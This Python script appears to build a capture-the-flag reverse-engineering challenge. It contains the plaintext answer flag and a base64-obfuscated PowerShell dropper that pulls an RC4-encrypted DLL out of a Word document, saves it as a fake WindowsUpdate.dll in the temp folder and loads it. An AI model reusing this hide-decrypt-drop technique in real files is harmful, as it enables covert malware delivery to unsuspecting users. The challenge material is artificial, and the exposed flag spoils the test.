from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

iv=b'\xde\xad\xbe\xef\x01\x01\x04\x05\x01\x04\x01\x09\x01\x09\x82\x82'
print('iv:',[i for i in iv])
print(len(iv))
k=b'not important k~'
d=b'flag{A_ma1war3_w1ll_g3t_ur_s3cr3t_f1le}'
d=pad(d,16,'pkcs7')
aes=AES.new(k,iv=iv,mode=AES.MODE_CBC)
print('res:',[i for i in aes.encrypt(d)])
print('magic: ',(ord('D')<<24)+(ord('0')<<16)+(ord('C')<<8)+ord('M'))
s='ZnVuY3Rpb24gbnVsbF9mdW5jKCRrZXkpewogICAgJHM9MC4uMjU1CiAgICAkaz0wLi4yNTUKICAgIGZvcmVhY2goJGkgaW4gMC4uMjU1KXsKICAgICAgICAka1skaV09W2ludF0ka2V5WyRpJSRrZXkuTGVuZ3RoXQogICAgfQogICAgJGo9MAogICAgZm9yZWFjaCgkaSBpbiAwLi4yNTUpewogICAgICAgICRqPSgkaiskc1skaV0rJGtbJGldKSUyNTYKICAgICAgICAkc1skaV0sJHNbJGpdPSRzWyRqXSwkc1skaV0KICAgIH0KICAgIHJldHVybiAkcwp9CmZ1bmN0aW9uIG51bGxfZnVuYzIoJHMsJGQpewogICAgJGksJGosJHQ9MCwwLDAKICAgIGZvcmVhY2goJGsgaW4gMC4uKCRkLkxlbmd0aC0xKSl7CiAgICAgICAgJGk9KCRpKzEpJTI1NgogICAgICAgICRqPSgkaiskc1skaV0pJTI1NgogICAgICAgICRzWyRpXSwkc1skal09JHNbJGpdLCRzWyRpXQogICAgICAgICR0PSgkc1skaV0rJHNbJGpdKzEpJTI1NgogICAgICAgICRkWyRrXT0kZFska10gLWJ4b3IgJHNbJHRdCiAgICB9CiAgICByZXR1cm4gJGQKfQpmdW5jdGlvbiBudWxsX2Z1bmMzKCRmKXsKICAgICRtPShbaW50XSRmWy0xXSsoW2ludF0kZlstMl0gLXNobCA4KSsoW2ludF0kZlstM10gLXNobCAxNikrKFtpbnRdJGZbLTRdIC1zaGwgMjQpKQoKICAgIGlmKCRtIC1lcSAweDQ0MzA0MzRkKXsKICAgICAgICAkbGVuPVtpbnRdJGZbLTVdKyhbaW50XSRmWy02XSAtc2hsIDgpKyhbaW50XSRmWy03XS1zaGwgMTYpKyhbaW50XSRmWy04XSAtc2hsIDI0KQogICAgICAgICRzPW51bGxfZnVuYyAiTjB0aGluZ190b19zZWUiCiAgICAgICAgcmV0dXJuIG51bGxfZnVuYzIgJHMgJGZbKC04LSRsZW4pLi4tOF0KICAgIH1lbHNlewogICAgICAgIHJldHVybiAkbnVsbAogICAgfQp9CmlmICggJGFyZ3MuQ291bnQgLWx0IDEgKSB7CiAgICBXcml0ZS1PdXRwdXQgImZsYWd7SSB0aGluayB5b3UgZG9uJ3QgbmVlZCB0aGlzIEZha2UgRmxhZ30iCiAgICBFeGl0Cn0KJHA9JGFyZ3NbMF0KJGY9W1N5c3RlbS5JTy5GaWxlXTo6UmVhZEFsbEJ5dGVzKCRwKQokZD1udWxsX2Z1bmMzICRmCmlmKCRudWxsIC1lcSAkZCl7CiAgICBXcml0ZS1PdXRwdXQgImZsYWd7Tm8gTmVlZCBmb3IgdGhpcyBmYWtlIGZsYWd9IgogICAgRXhpdAp9CiR0cGF0aD0kZW52OlRFTVArIlxQcm9ncmFtRmlsZXNcIgppZiAoKFRlc3QtUGF0aCAkdHBhdGgpIC1lcSAkZmFsc2UpewogICAgbWtkaXIgJHRwYXRoCn0KJHRmaWxlPSR0cGF0aCsiXFdpbmRvd3NVcGRhdGUuZGxsIgpbU3lzdGVtLklPLkZpbGVdOjpXcml0ZUFsbEJ5dGVzKCR0ZmlsZSwkZCkKSW1wb3J0LU1vZHVsZSAkdGZpbGUKJG09W0hlbGxvV29ybGRBcHBsaWNhdGlvbi5NYWluMV06Om5ldygpCmlmKCR0cnVlIC1lcSAkbS5kKCRlbnY6VVNFUlBST0ZJTEUpKXsKICAgIFtTeXN0ZW0uUmVmbGVjdGlvbi5Bc3NlbWJseV06OkxvYWRXaXRoUGFydGlhbE5hbWUoIlN5c3RlbS5XaW5kb3dzLkZvcm1zIikKICAgIFtTeXN0ZW0uV2luZG93cy5Gb3Jtcy5NZXNzYWdlQm94XTo6c2hvdygiWW91IGFyZSBSaWdodCEhISwgUGxlYXNlIHN1Ym1pdCB0aGUgZmxhZyIpCn0='
for i in range(0,len(s),1000):
    print('\"'+s[i:i+1000]+'\"& _')

with open('report.doc','rb') as f:
    d=f.read()
    e=open('update_enc.dll','rb').read()
    with open('pre.doc','wb') as ff:
        ff.write(d)
        ff.write(e)
        l=len(e)
        ff.write(bytes([(l>>24)&0xff,(l>>16)&0xff,(l>>8)&0xff,l&0xff]))
        ff.write(b'D0CM')



# WhyCanYouSee